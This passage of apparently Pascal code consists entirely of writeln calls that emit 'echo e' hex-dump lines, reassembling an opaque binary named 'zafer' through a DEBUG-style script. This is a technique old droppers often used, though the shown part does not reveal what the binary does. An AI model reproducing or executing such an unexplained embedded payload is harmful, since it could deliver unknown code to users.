   writeln(qup,'echo e 1070  7E AB 8A 5A 09 25 E1 ED 26 8C 1E 0B 6B 76 B3 6D>>zafer');
   writeln(qup,'echo e 1080  9C 63 6A 38 16 14 07 FE 06 0D 72 10 DB 46 11 DC>>zafer');
   writeln(qup,'echo e 1090  7E CB 80 B0 DC 9D 05 50 FC FE C8 EB 09 9D B0 5A>>zafer');
   writeln(qup,'echo e 10A0  65 85 E4 EF C0 B3 87 B4 F5 41 B4 09 E8 2F CB 26>>zafer');
   writeln(qup,'echo e 10B0  8F 06 74 46 8F C8 D4 59 A1 92 38 A9 78 86 BD 86>>zafer');
   writeln(qup,'echo e 10C0  C6 B1 03 5B 9D D3 85 E2 C7 C4 8B D0 BD EA 21 02>>zafer');
   writeln(qup,'echo e 10D0  A0 BF 46 8A E0 C4 1E E2 8B 06 3F 82 E1 DB 16 67>>zafer');
   writeln(qup,'echo e 10E0  75 8D 06 2A AD 81 83 F6 05 51 B9 04 3C D1 31 B8>>zafer');
   writeln(qup,'echo e 10F0  99 43 E2 D6 8F 0F FF 38 01 E2 EE 5A EB B7 53 D4>>zafer');
   writeln(qup,'echo e 1100  81 61 B6 2E 5A 6A DA CD 81 85 37 6E 6C 5B 02 A5>>zafer');
   writeln(qup,'echo e 1110  81 F1 CF E8 3E FE 2B B7 0B 76 F9 01 5F E3 3A EE>>zafer');
   writeln(qup,'echo e 1120  1D 71 40 B4 B4 1B 0C BA 14 23 FE 91 E1 7F 33 3C>>zafer');
   writeln(qup,'echo e 1130  0E F5 F4 72 0D 8A D0 6A 17 51 7A 2F B0 2E FF 97>>zafer');
   writeln(qup,'echo e 1140  D8 A2 0C 1A 85 47 8B FD AC 56 31 EB AD 49 2A 5A>>zafer');
   writeln(qup,'echo e 1150  0A 05 9A A9 AD 25 AD 05 0B FF E4 FC C3 FC E9 7B>>zafer');
   writeln(qup,'echo e 1160  13 E8 FB C5 FF 73 0B 3C 8F 7A 02 32 E0 9B D6 B8>>zafer');
   writeln(qup,'echo e 1170  FF 02 F3 DA 52 B0 85 76 4B 2F 05 D1 A0 EB B0 52>>zafer');
   writeln(qup,'echo e 1180  0E BF 70 E8 18 F2 58 3A FE 06 F8 01 77 06 3A 26>>zafer');
   writeln(qup,'echo e 1190  D4 05 2B 98 7C 5B 1F 05 02 3E 87 4E 81 08 31 43>>zafer');
   writeln(qup,'echo e 11A0  8A FB A0 C4 06 26 21 62 10 DB 27 A2 03 40 A8 86>>zafer');
   writeln(qup,'echo e 11B0  50 D2 A8 14 5E D1 A1 DD 01 36 36 E1 25 0A B7 19>>zafer');
   writeln(qup,'echo e 11C0  3A E8 01 CB 75 12 EA 6F 05 0C 3A 2E BA EC F8 3A>>zafer');
   writeln(qup,'echo e 11D0  14 80 4D 0E F9 EE 9C E8 4B 6C 7B 6B 68 0F AF F1>>zafer');
   writeln(qup,'echo e 11E0  D6 9D 73 50 ED F1 02 7F 97 03 C6 F4 43 7C 7D CB>>zafer');
   writeln(qup,'echo e 11F0  F4 E8 20 05 B4 0E 07 AA 0F 7F 42 C0 FD A1 DF BC>>zafer');
   writeln(qup,'echo e 1200  01 7C 1B CE FD 0B 1E 86 B6 0E 6B E3 DF 22 FD F2>>zafer');
   writeln(qup,'echo e 1210  E8 1B 86 FD D6 C1 A3 FD BB EF A1 DA 44 7C 9E FD>>zafer');
   writeln(qup,'echo e 1220  C3 F9 28 57 36 85 C8 6D 03 E9 D5 09 26 2C D6 BF>>zafer');
   writeln(qup,'echo e 1230  1B FA 8E ED C3 26 A0 9D 0B 83 A3 6D AB B4 5B A2>>zafer');
   writeln(qup,'echo e 1240  D5 FE FC 8A D7 8A F7 A2 DC DC 77 CC 3C 6F 1A 04>>zafer');
   writeln(qup,'echo e 1250  B0 04 56 0D B7 1A BB 6E F1 07 D7 80 E4 AE DD E3>>zafer');
   writeln(qup,'echo e 1260  4A 16 2E 23 EA E8 C4 00 D6 7F 39 B7 69 BA 18 FF>>zafer');
   writeln(qup,'echo e 1270  00 B4 11 E8 A1 FC 42 59 C6 8A EA 6A DB 50 18 CA>>zafer');
   writeln(qup,'echo e 1280  EF FE 59 58 D7 76 D1 0E EB 77 D7 35 82 0A D7 25>>zafer');
   writeln(qup,'echo e 1290  18 52 99 B6 15 8A EB EB A3 FE 76 A1 D1 05 CB DF>>zafer');
   writeln(qup,'echo e 12A0  EB 2D E1 4D 05 19 C7 75 10 52 E8 07 75 DE CE 0C>>zafer');
   writeln(qup,'echo e 12B0  0C A3 97 20 A2 D6 6F AA 93 FC 89 B4 0E B1 2B 48>>zafer');
   writeln(qup,'echo e 12C0  36 AD 75 C0 DB 55 FC AF BA 82 01 50 65 F6 23 4A>>zafer');
   writeln(qup,'echo e 12D0  4C B6 B6 80 AC 38 7C C7 F3 F8 C3 02 E0 30 01 8B>>zafer');
   writeln(qup,'echo e 12E0  E4 19 EC 40 34 51 AD F6 A2 84 01 2C 56 B8 B8 6D>>zafer');
   writeln(qup,'echo e 12F0  3B 19 28 D4 F8 07 BC FD 71 35 87 18 57 57 76 60>>zafer');
   writeln(qup,'echo e 1300  A2 C8 15 13 6D D5 10 BF 08 C9 06 88 26 C3 47 CD>>zafer');
   writeln(qup,'echo e 1310  C0 7A 6E CC B4 1B 06 DC FF 3C 1B 75 43 8A 45 25>>zafer');
   writeln(qup,'echo e 1320  3C 06 1A FB 3C 8A 5D 31 09 74 2D A2 BA EE C4 3D>>zafer');
   writeln(qup,'echo e 1330  5E 61 05 A3 BC 15 D9 BC 0E 02 A2 BE 46 6B B6 3F>>zafer');
   writeln(qup,'echo e 1340  10 D9 04 C9 69 A8 88 6F 56 08 FD 18 E8 E7 00 72>>zafer');
   writeln(qup,'echo e 1350  5A F2 17 08 B5 4F 2F ED 40 B3 10 FC B4 12 E8 7A>>zafer');
   writeln(qup,'echo e 1360  FB F6 6F 57 75 42 A0 FE C5 06 25 30 00 3C 30 0B>>zafer');
   writeln(qup,'echo e 1370  3F 78 C4 3A E7 95 2D F2 27 04 3A 80 E1 37 34 F9>>zafer');
   writeln(qup,'echo e 1380  05 AD 77 01 F8 C1 06 80 E9 09 36 8C B5 DF 4F 02>>zafer');
   writeln(qup,'echo e 1390  B5 01 88 B7 2E 51 FE C3 FC 32 FF B1 06 D3 E3 5A>>zafer');
   writeln(qup,'echo e 13A0  13 DD A7 EB 17 DB 41 24 30 40 BB 0E FE 0E 1A AC>>zafer');
   writeln(qup,'echo e 13B0  0E BE D2 2C 8F 77 CC 0E 74 0D 1F AD 0A 0A B8 08>>zafer');
   writeln(qup,'echo e 13C0  0D 5A AC DD 17 20 77 88 1E B6 1E BA 85 29 C0 B4>>zafer');
   writeln(qup,'echo e 13D0  EF DA 88 80 FA DB A4 20 2B C2 25 DF 13 7B 20 78>>zafer');
   writeln(qup,'echo e 13E0  1E 15 E8 5C 7D 2D 8A B7 2E 09 BA BF F1 03 B0 01>>zafer');
   writeln(qup,'echo e 13F0  EE E2 25 58 C9 1C 5B E1 C6 3D B4 01 BA B8 34 EC>>zafer');
   writeln(qup,'echo e 1400  24 5B BD E0 04 BC 3A C4 E1 F9 6E 16 88 0E D8 15>>zafer');
   writeln(qup,'echo e 1410  5F 75 42 8F 6F A1 88 04 10 BE CC 75 52 A8 08 DC>>zafer');
   writeln(qup,'echo e 1420  D3 34 02 2C 16 26 68 4E 56 47 A3 8D 31 80 30 E7>>zafer');
   writeln(qup,'echo e 1430  CB 12 44 A8 B7 95 24 0A F0 0D 81 26 B8 36 FF FE>>zafer');
   writeln(qup,'echo e 1440  47 2C EB 23 68 06 5B 3C 00 11 F3 00 01 89 60 6D>>zafer');
   writeln(qup,'echo e 1450  11 4D 0C 4F 1B 59 B0 02 0C 93 18 8D 6B AE 87 DB>>zafer');
   writeln(qup,'echo e 1460  55 33 59 D7 BF 58 80 CC C6 30 A0 2C F8 24 07 2C>>zafer');
   writeln(qup,'echo e 1470  07 ED 56 E4 EF AF AA 69 06 3A BB 19 07 F6 0C 8A>>zafer');
   writeln(qup,'echo e 1480  2D A9 E1 07 B3 33 6B B1 0E FA B4 DF 51 B8 3A D0>>zafer');
   writeln(qup,'echo e 1490  01 16 37 FB 50 A9 02 12 60 D4 66 E5 05 DA D5 2F>>zafer');
   writeln(qup,'echo e 14A0  E8 14 59 C7 2E E8 8A C7 FA 8A A4 51 2A BD C8 C1>>zafer');
   writeln(qup,'echo e 14B0  32 ED 7A B5 D5 50 A0 40 76 67 44 DB 04 0A FA EB>>zafer');
   writeln(qup,'echo e 14C0  01 B0 20 C5 B4 C5 F9 8E 60 5F FA 31 31 6F A9 02>>zafer');
   writeln(qup,'echo e 14D0  03 04 46 B8 85 78 FF 1A 3C 7F 16 1B 10 11 18 FE>>zafer');
   writeln(qup,'echo e 14E0  19 3C 1F 77 12 3C 0D 05 55 C2 3C 1C AF FF 2C 0E>>zafer');
   writeln(qup,'echo e 14F0  98 93 2E 8A 9F FA 05 13 93 C3 BB 54 2D CB BB E9>>zafer');
   writeln(qup,'echo e 1500  7C D2 E8 A2 E5 6F 9C 56 E8 57 A5 FD F3 AE CE 30>>zafer');
   writeln(qup,'echo e 1510  BC FA 67 1D 8C B4 83 08 8E 10 58 1C 8D 6B EC 86>>zafer');
   writeln(qup,'echo e 1520  E3 91 66 7A FB F9 91 34 04 02 FB 8A 5E 39 77 31>>zafer');
   writeln(qup,'echo e 1530  A2 0D 21 12 17 86 38 B7 FB 62 25 88 DB 1E D9 0C>>zafer');
   writeln(qup,'echo e 1540  ED 8E 74 1F 6D 0C 18 B7 C2 D6 C6 03 4A AD 0C 16>>zafer');
   writeln(qup,'echo e 1550  6B 09 1A 66 D8 6D 47 F8 3B DD 00 BE 28 19 40 01>>zafer');
   writeln(qup,'echo e 1560  C8 83 1B 70 0F 3F 28 9F 15 78 AD 00 0A D0 10 18>>zafer');
   writeln(qup,'echo e 1570  BF B4 EF 14 48 15 B2 F6 15 30 18 60 3D FE 18 AD>>zafer');
   writeln(qup,'echo e 1580  18 E2 15 00 83 FD 7B 19 80 02 28 3F 04 00 01 03>>zafer');
   writeln(qup,'echo e 1590  21 C9 EC 1C 07 DC D0 02 5E 2F 45 B0 0F 02 74 28>>zafer');
   writeln(qup,'echo e 15A0  00 F9 21 14 72 44 15 1E C2 15 46 08 CF 00 00 18>>zafer');
   writeln(qup,'echo e 15B0  27 BB E1 F8 13 B0 93 82 C5 8D 19 85 20 C6 95 C9>>zafer');
   writeln(qup,'echo e 15C0  0B 8C 22 AD 06 57 85 3C B8 81 11 4E 7B BB A6 13>>zafer');
   writeln(qup,'echo e 15D0  CA 61 28 C2 76 BB CF 24 F8 02 02 C4 B9 05 DA E0>>zafer');
   writeln(qup,'echo e 15E0  E8 8E 02 D0 AC A3 DA 99 FE 23 75 26 B4 07 0C D9>>zafer');
   writeln(qup,'echo e 15F0  E3 0D C3 E5 40 5F 7B D0 C0 EC 88 CF 67 52 B4 02>>zafer');
   writeln(qup,'echo e 1600  39 2F EB F4 01 0F 75 4C 0D F8 0F 1C 74 EF A6 FD>>zafer');
   writeln(qup,'echo e 1610  01 20 18 85 A0 B6 85 A2 DF 68 0B 5C ED 70 07 2C>>zafer');
   writeln(qup,'echo e 1620  10 57 6D 36 38 7A 8C B4 5E 49 1F C7 0D AC D0 4C>>zafer');
   writeln(qup,'echo e 1630  2C E4 D3 0B 14 F6 5B FB CC 42 3C DA 1E 06 EB 0D>>zafer');
   writeln(qup,'echo e 1640  E3 27 41 C9 7D F7 7E AB 03 C3 E2 FB 03 C2 7E B1>>zafer');
   writeln(qup,'echo e 1650  28 3D B1 50 0E 4A F8 D9 74 4C 3A 1E 51 C6 BD F0>>zafer');
   writeln(qup,'echo e 1660  45 80 FF BB 3D 3B 48 92 FD 0C F9 74 37 8B 82 15>>zafer');
   writeln(qup,'echo e 1670  65 2F 83 2B 3C 5F 14 08 2D 22 B6 0C 32 12 E3 1C>>zafer');
   writeln(qup,'echo e 1680  EB 95 77 FB 28 9D B6 A8 03 CF BA 04 D0 B6 2E 0B>>zafer');
   writeln(qup,'echo e 1690  88 E6 7F 8F 88 DB 3A AF 2E F4 18 74 0B 3B 12 7C>>zafer');
   writeln(qup,'echo e 16A0  93 2B 52 78 F8 01 12 B3 30 B0 9F C7 DB 0F 1D 91>>zafer');
   writeln(qup,'echo e 16B0  00 7C 20 32 4E 70 FF 27 12 B8 12 11 C8 32 DB 70>>zafer');
   writeln(qup,'echo e 16C0  B8 A1 85 FD 5C 04 D9 DE E9 60 03 49 38 1E 44 2C>>zafer');
   writeln(qup,'echo e 16D0  8F 40 BC EC F7 C3 A3 75 D1 C4 F1 4D 05 66 FA D8>>zafer');
   writeln(qup,'echo e 16E0  CA F3 DF 55 18 0A F2 0A 81 F4 71 61 3A 3D B4 77>>zafer');
   writeln(qup,'echo e 16F0  0C 0A 9F 94 6B 28 97 D8 82 18 F6 3C 3C 85 3C 1B>>zafer');
   writeln(qup,'echo e 1700  9E 00 44 A9 BF 29 7A F9 E9 84 17 9A E0 F8 0A 56>>zafer');
   writeln(qup,'echo e 1710  3B DF F3 86 83 C2 16 5F 0A 0F C4 77 E8 A0 BD 56>>zafer');
   writeln(qup,'echo e 1720  E2 0A DD 0A 22 DD 77 0E D9 86 C7 02 BA 70 13 9F>>zafer');
   writeln(qup,'echo e 1730  AC 0C 8A C6 F4 F6 D0 0A C2 AD 9D 52 13 69 6D C2>>zafer');
   writeln(qup,'echo e 1740  A3 4F 16 C4 FF 80 E6 0F D0 E2 80 E2 C1 10 0A D0>>zafer');
   writeln(qup,'echo e 1750  41 07 BE 6B D2 E4 A8 10 05 85 4B C5 80 E1 0A E6>>zafer');
   writeln(qup,'echo e 1760  8A CE 92 70 85 D2 91 D0 B6 1C E1 88 ED 7C 8A DA>>zafer');
   writeln(qup,'echo e 1770  6B E9 B3 E4 0B 63 F8 D1 FE E8 DC 05 72 0C 0D 77>>zafer');
   writeln(qup,'echo e 1780  C4 CD 2A 37 14 FE 06 DD D6 06 BB C9 83 B4 96 0D>>zafer');
   writeln(qup,'echo e 1790  ED 0E 00 3C AD DF B0 F5 21 00 FA EC B0 5D FC BF>>zafer');
   writeln(qup,'echo e 17A0  06 24 FB EE FB A2 85 DE F0 D1 51 05 75 6A 10 7B>>zafer');
   writeln(qup,'echo e 17B0  33 9E 5B 20 FC DF 76 07 06 FE 06 60 83 E8 7C 96>>zafer');
   writeln(qup,'echo e 17C0  04 24 10 1A DC DA 22 1B 05 00 07 3B 3B 25 74 0B>>zafer');
   writeln(qup,'echo e 17D0  D1 9A 48 6A A5 B4 22 5C FF D9 37 26 78 EF C3 2E>>zafer');
   writeln(qup,'echo e 17E0  B7 F2 78 16 6C 79 56 16 D8 8D 13 FE 83 F9 29 75>>zafer');
   writeln(qup,'echo e 17F0  0D 51 BF 2D A8 88 B9 D4 A3 6F 48 F3 AB 59 8D BF>>zafer');
   writeln(qup,'echo e 1800  51 A3 0E 94 A8 FC D4 CB 68 9B E0 6F 6C 4E 2D 32>>zafer');
   writeln(qup,'echo e 1810  73 68 26 1F D0 39 0A C1 85 3A 16 CA ED 53 50 AE>>zafer');
   writeln(qup,'echo e 1820  C6 A0 E0 5D F8 F8 52 8B D1 14 42 5E E5 95 FD BD>>zafer');
   writeln(qup,'echo e 1830  15 03 0E 14 1B 12 0E EC F2 06 5A 12 B6 0E FF F4>>zafer');
   writeln(qup,'echo e 1840  06 58 8B C8 33 D2 65 10 B5 94 6B 94 3A 52 DE DB>>zafer');
   writeln(qup,'echo e 1850  FA 9C 8B B0 CB 18 39 F8 06 FB DD 57 C7 A2 A8 08>>zafer');
   writeln(qup,'echo e 1860  56 56 14 82 5C 5B 1E 1D 5D 01 1F 15 BF ED 8C D8>>zafer');
   writeln(qup,'echo e 1870  36 03 06 FB 2E 01 8E D8 58 0B A4 C0 F6 C0 58 17>>zafer');
   writeln(qup,'echo e 1880  32 2B 0F EE 86 C4 ED 42 EE 4A 12 F4 52 BA C4 03>>zafer');
   writeln(qup,'echo e 1890  BA 75 EE 42 5E D0 EE BA CE 07 ED 8D 42 98 6B 17>>zafer');
   writeln(qup,'echo e 18A0  11 DE 07 29 6F 58 10 37 08 22 5D FF 07 07 7B 2A>>zafer');
   writeln(qup,'echo e 18B0  07 A5 05 E1 A0 FC 01 40 50 A0 88 60 09 20 0A C0>>zafer');
   writeln(qup,'echo e 18C0  07 BF 04 12 13 14 15 16 B3 17 0F 8D 14 91 FE 39>>zafer');
   writeln(qup,'echo e 18D0  3A 3B 3C 3D 3E 3F 2D 67 9B C3 28 A0 0A 18 13 47>>zafer');
   writeln(qup,'echo e 18E0  FD BF 02 07 57 C5 36 2C A3 B9 4A 67 17 38 AA 5A>>zafer');
   writeln(qup,'echo e 18F0  B4 1F 6E 3C E6 10 88 76 38 2F 78 1F 3D 50 DB 2E>>zafer');
   writeln(qup,'echo e 1900  7D 3B D0 95 20 BA F8 0B 02 37 65 86 F8 D9 B0 00>>zafer');
   writeln(qup,'echo e 1910  27 63 A5 C6 C5 32 F8 32 F2 36 EC 39 AE 09 06 BC>>zafer');
   writeln(qup,'echo e 1920  81 52 7E 22 E0 D0 E4 0A 29 EA 53 F8 55 FC A1 FB>>zafer');
   writeln(qup,'echo e 1930  2D 5B 28 41 FF 3B C1 72 46 26 AD 99 83 81 FF D3>>zafer');
   writeln(qup,'echo e 1940  AD 92 08 EC 92 83 FA 5E E0 0A 5B 73 51 61 FE 59>>zafer');
   writeln(qup,'echo e 1950  72 27 E2 DF C7 29 8B D9 F6 4E 4E FD 4B 2B 0C 03>>zafer');
   writeln(qup,'echo e 1960  D7 53 20 4B 09 5B FA 72 05 E2 E8 F8 E8 04 FC 8D>>zafer');
   writeln(qup,'echo e 1970  DA 81 96 A6 7F CA EB 39 56 8B DD 0B 9A FF D4 1E>>zafer');
   writeln(qup,'echo e 1980  30 B8 FE 1F 3B 2D 1A 68 87 26 FF 00 BB 28 1E 4F>>zafer');
   writeln(qup,'echo e 1990  11 62 0F 34 03 1A DA DB 4C 8B 0B AA 77 6A FD 3B>>zafer');
   writeln(qup,'echo e 19A0  2D 55 83 08 4D 62 44 5B 11 1E 0A 5F 21 E8 6B FF>>zafer');
   writeln(qup,'echo e 19B0  22 68 FC 5F DE 98 96 03 F1 FB 1E 8E DB AD 1F FA>>zafer');
   writeln(qup,'echo e 19C0  7B 50 83 C3 2C 7A 47 02 0B 5E 47 F6 83 EB D8 9D>>zafer');
   writeln(qup,'echo e 19D0  4F 97 78 F8 3B EE 37 72 F4 15 0B 67 A3 0B 51 B1>>zafer');
   writeln(qup,'echo e 19E0  FB 22 E8 85 FF 91 B0 7F 3D 8B DC 8B C4 2B 6F D0>>zafer');
   writeln(qup,'echo e 19F0  32 2D 12 16 5E D4 2D BB 92 4D 04 BC 46 05 B5 1F>>zafer');
   writeln(qup,'echo e 1A00  A2 03 D1 D0 A0 CD 14 33 6B 7A 8C 42 2B AB 45 5F>>zafer');
   writeln(qup,'echo e 1A10  00 2B ED E1 89 2E 0D 82 FF DD 4D FF 2E BA 22 0B>>zafer');
   writeln(qup,'echo e 1A20  DB 16 46 52 D6 1E 08 BB 25 E9 19 A2 09 D9 76 B3>>zafer');
   writeln(qup,'echo e 1A30  71 8A 46 2D 64 54 03 52 7F E8 03 0A BB 06 90 E9>>zafer');
   writeln(qup,'echo e 1A40  E0 2E 09 81 BB DD 94 73 FE 30 B8 08 80 E8 C9 09>>zafer');
   writeln(qup,'echo e 1A50  AE 41 B7 13 78 E3 22 DB B8 0A 0D BB F4 09 8B 46>>zafer');
   writeln(qup,'echo e 1A60  02 AE 59 CC B7 B8 20 E8 AD AD 09 7D EE B9 11 24>>zafer');
   writeln(qup,'echo e 1A70  37 DB B8 09 1B 9F 42 B9 DB 0B 05 99 8B 09 79 AA>>zafer');
   writeln(qup,'echo e 1A80  E3 5F 87 F1 83 C6 02 03 4D B7 DB AC 1F FA E8 D9>>zafer');
   writeln(qup,'echo e 1A90  09 E2 F6 D6 9D 3E CB 7C 56 6B FA 15 74 B0 3A 6B>>zafer');
   writeln(qup,'echo e 1AA0  BE 0A 94 AB B7 47 7F A9 09 8A C2 E9 A4 F7 09 56>>zafer');
   writeln(qup,'echo e 1AB0  1E 50 67 6D AB FE 2E B5 96 E2 4B C4 59 82 AD 5A>>zafer');
   writeln(qup,'echo e 1AC0  B5 16 2D 02 88 0F 5E 89 0B 93 AD 1B AD C2 76 ED>>zafer');
   writeln(qup,'echo e 1AD0  EB 92 EB 72 ED EB E5 1F C6 8A 92 FF A5 E8 53 09>>zafer');
   writeln(qup,'echo e 1AE0  A1 A2 7A 56 1F 49 EC 6E 04 B2 74 98 73 2D D8 42>>zafer');
   writeln(qup,'echo e 1AF0  6F F4 3C 09 E9 B5 58 78 2F 0E 8D 1E A6 FC 03 8C>>zafer');
   writeln(qup,'echo e 1B00  17 A1 A0 03 46 DA FB A1 51 04 50 06 6D 06 02 FD>>zafer');
   writeln(qup,'echo e 1B10  08 A1 53 04 48 48 BB 07 0A 2B 0D 61 48 82 7F 0A>>zafer');
   writeln(qup,'echo e 1B20  C7 07 FE FF 5B EF 89 07 1F 50 06 30 BB 44 00 A1>>zafer');
   writeln(qup,'echo e 1B30  E0 7E 06 0B DF 29 06 74 15 E9 C3 99 07 1E 48 8B>>zafer');
   writeln(qup,'echo e 1B40  6C 1D C5 6D 2B A0 BD 0E 50 9A 35 52 68 AF 27 AF>>zafer');
   writeln(qup,'echo e 1B50  FB 3E A9 02 49 B1 E2 00 36 E0 DD 00 C9 88 67 1E>>zafer');
   writeln(qup,'echo e 1B60  FD EB 5E CB 1E 81 A2 D8 36 38 18 05 52 A5 04 BF>>zafer');
   writeln(qup,'echo e 1B70  DD 00 04 0A 1A 20 85 19 5A C4 C1 3F 16 21 B7 5A>>zafer');
   writeln(qup,'echo e 1B80  52 00 D6 E9 FD 5D FF 00 0C CD 21 B8 0D 80 BA A3>>zafer');
   writeln(qup,'echo e 1B90  DA 4C 85 0D 80 8F 37 5B B1 02 55 EA 71 BA 6F 05>>zafer');
   writeln(qup,'echo e 1BA0  D8 04 03 5A 0C 08 3B E2 B1 01 E0 4B 74 E8 39 BA>>zafer');
   writeln(qup,'echo e 1BB0  2E A4 B4 33 DF 1C 88 16 1C 07 D2 32 D2 C5 BF 0B>>zafer');
   writeln(qup,'echo e 1BC0  C3 8A 73 0C 0A 04 46 A9 3F 05 9A D5 1B 37 53 F4>>zafer');
   writeln(qup,'echo e 1BD0  05 7D 0B BA 0D 53 03 CD 40 5C FA F3 E8 02 FB E8>>zafer');
   writeln(qup,'echo e 1BE0  D5 5B 22 3D D8 55 21 50 C7 B0 D5 07 BE A4 D7 07>>zafer');
   writeln(qup,'echo e 1BF0  B9 C8 D6 85 0C FD 48 75 FD E2 F8 AF 10 8D 7F 92>>zafer');
   writeln(qup,'echo e 1C00  E8 E5 07 F0 CB C3 1E 06 02 9B 68 5A 78 8C DE 4E>>zafer');
   writeln(qup,'echo e 1C10  07 B8 04 C6 0C 30 69 32 64 24 66 34 C0 36 07 BD>>zafer');
   writeln(qup,'echo e 1C20  1A BA 3C 24 57 61 ED BA 40 07 9B 04 E8 C1 C0 FF>>zafer');
   writeln(qup,'echo e 1C30  07 0F FC 08 A0 C3 66 DB 73 DA 8E 6E 03 F1 42 24>>zafer');
   writeln(qup,'echo e 1C40  B6 07 F7 8D E6 B7 FF 9B FA 03 B9 03 89 D8 1F 74>>zafer');
   writeln(qup,'echo e 1C50  27 7A 39 F7 E4 2D 2D D4 16 AC 68 45 5D 09 30 73>>zafer');
   writeln(qup,'echo e 1C60  6E 09 3B 34 6B 95 75 BB C3 5A 83 05 63 6D C3 F4>>zafer');
   writeln(qup,'echo e 1C70  BC 03 45 F0 58 1B C5 74 EA 1B 77 1B EB 20 52 FD>>zafer');
   writeln(qup,'echo e 1C80  52 A7 F1 4A 8A 36 28 2E DE E0 E8 20 F0 25 8C D2>>zafer');
   writeln(qup,'echo e 1C90  80 EE 8B F0 17 EB 2B 1B 30 0E FD 5A 02 51 49 86>>zafer');
   writeln(qup,'echo e 1CA0  E9 A0 20 37 32 36 5B F0 02 4A FE CE 1C 2D 18 40>>zafer');
   writeln(qup,'echo e 1CB0  2F 6A E3 EF 5A 82 B6 44 C4 6F DE F0 E8 EF FF EF>>zafer');
   writeln(qup,'echo e 1CC0  58 5B 59 5A 3C 02 77 43 4F 2D 7A 5A 6E A3 44 BA>>zafer');
   writeln(qup,'echo e 1CD0  50 8B F4 50 61 5A AB 36 9F E8 0B FB 54 75 36 C3>>zafer');
   writeln(qup,'echo e 1CE0  77 D2 E8 83 F3 06 B0 E0 39 07 9F 98 74 34 E0 E8>>zafer');
   writeln(qup,'echo e 1CF0  3D F0 98 11 13 B5 02 DB B1 F9 2D A8 36 7D EA AC>>zafer');
   writeln(qup,'echo e 1D00  36 6B A3 23 74 72 0D 6A 49 DE C0 42 B4 02 DF 04>>zafer');
   writeln(qup,'echo e 1D10  4F 75 EC 46 FF 4E 8B CF EB 7F 5A EB 6F 78 2C 03>>zafer');
   writeln(qup,'echo e 1D20  CF 51 DF 28 F6 E6 02 C2 12 ED E7 D1 E0 33 97 1E>>zafer');
   writeln(qup,'echo e 1D30  D1 E3 02 BD C5 87 BD 9B 97 02 D1 A2 0E 66 1C 4E>>zafer');
   writeln(qup,'echo e 1D40  A0 DE 6A F1 01 53 E6 4F 49 D4 36 9E 98 2B 36 A5>>zafer');
   writeln(qup,'echo e 1D50  C0 9B C7 23 52 53 9A 60 FB 90 D5 FF 36 7A 13 A8>>zafer');
   writeln(qup,'echo e 1D60  2D 09 FE F4 AC 3A C7 72 A5 93 D6 0E 1A FC FB 93>>zafer');
   writeln(qup,'echo e 1D70  AB E2 E5 46 9C DF 0A 12 04 6D 0B F8 BD 76 2B D1>>zafer');
   writeln(qup,'echo e 1D80  5B 48 47 F8 89 97 50 04 2E C1 0A 66 0E B2 07 0E>>zafer');
   writeln(qup,'echo e 1D90  42 B2 55 B6 65 38 D1 01 2C B6 FA 28 5B 19 DB CA>>zafer');
   writeln(qup,'echo e 1DA0  F3 3B 14 17 43 0A 1D D4 0F AF BF EF 73 12 D2 AD>>zafer');
   writeln(qup,'echo e 1DB0  A2 80 B5 BA 02 A3 36 99 B7 B4 40 2A 38 18 57 06>>zafer');
   writeln(qup,'echo e 1DC0  01 CA 54 2A 7C 05 BC 55 EE 70 0E 9E 14 04 66 03>>zafer');
   writeln(qup,'echo e 1DD0  F6 56 A2 67 0A B4 D0 4B 2D BB FD 66 04 91 E8 62>>zafer');
   writeln(qup,'echo e 1DE0  EA 22 BE 00 64 B6 1D EF 1D 4B 61 0A C1 A3 48 BD>>zafer');
   writeln(qup,'echo e 1DF0  16 E8 66 E9 02 AF DA 1E 09 2B 43 50 24 B4 8A D9>>zafer');
   writeln(qup,'echo e 1E00  64 06 15 B6 2F 10 19 DB 0E 34 0C 11 BD AD 8B 7E>>zafer');
   writeln(qup,'echo e 1E10  08 32 97 DC 23 E3 2A 1B 22 3B C1 C8 72 B0 FC C8>>zafer');
   writeln(qup,'echo e 1E20  2A 11 DE 6A C3 8E DA 2B 22 54 BF 49 F3 AA 1F EB>>zafer');
   writeln(qup,'echo e 1E30  1D 0B B0 51 12 D2 CB 1E 50 A2 57 75 35 B8 A9 96>>zafer');
   writeln(qup,'echo e 1E40  74 DE 28 53 57 56 2B BC DF 56 0C 26 E6 4A 59 C8>>zafer');
   writeln(qup,'echo e 1E50  06 3E DA 2B D9 53 FF 5E 46 10 75 18 DF E3 52 51>>zafer');
   writeln(qup,'echo e 1E60  D8 0B 01 05 FF 86 04 AA 46 E2 F7 1F 59 7F 59 EB>>zafer');
   writeln(qup,'echo e 1E70  42 E3 FB 16 87 CA E3 0F 03 70 73 E0 6F 05 5A F7>>zafer');
   writeln(qup,'echo e 1E80  DA FF 52 87 FE 93 EB D5 93 87 E3 F7 59 56 61 6D>>zafer');
   writeln(qup,'echo e 1E90  50 74 6D 62 52 CC 02 7A 7E 96 8B FA 9A 76 EE 07>>zafer');
   writeln(qup,'echo e 1EA0  5B 56 53 CF 83 06 59 EC 9A 4B 1F 7D 2F 5C 02 C2>>zafer');
   writeln(qup,'echo e 1EB0  3B 5D C9 D1 0F 2E 5D 34 8B 03 51 B0 26 87 BA A5>>zafer');
   writeln(qup,'echo e 1EC0  EB 14 05 09 DB EE E7 AB 96 63 36 56 66 C1 EA 35>>zafer');
   writeln(qup,'echo e 1ED0  CB F0 8F D9 64 D2 E7 05 F9 0C E4 E8 2D 06 8A C1>>zafer');
   writeln(qup,'echo e 1EE0  87 BF 42 87 17 0B D2 74 85 0E D1 41 E2 6A DC EF>>zafer');
   writeln(qup,'echo e 1EF0  9A 3B 52 A0 BC 23 53 68 78 3B FC EB EF 3D 24 5B>>zafer');
   writeln(qup,'echo e 1F00  AB 9A BA 7F 8A 50 F9 08 8C AF 58 20 FF D9 1D E5>>zafer');
   writeln(qup,'echo e 1F10  20 F8 20 4B 04 BB DA 05 01 21 FE 12 21 34 21 46>>zafer');
   writeln(qup,'echo e 1F20  21 53 35 8C 68 1D 2E 24 8E F9 F6 BA 88 0B 5B 39>>zafer');
   writeln(qup,'echo e 1F30  2B 7A 31 DA B4 0C D5 5C 0A B3 09 9A 6D 72 DA AF>>zafer');
   writeln(qup,'echo e 1F40  4B 55 9B 04 44 00 47 7E D1 50 D4 31 27 BB BB 72>>zafer');
   writeln(qup,'echo e 1F50  23 87 7C FE C8 74 1D 12 39 B6 1E 0E DF 05 7C 13>>zafer');
   writeln(qup,'echo e 1F60  02 C0 F1 98 53 93 51 0B 7B DE B6 1F B9 EC 01 4D>>zafer');
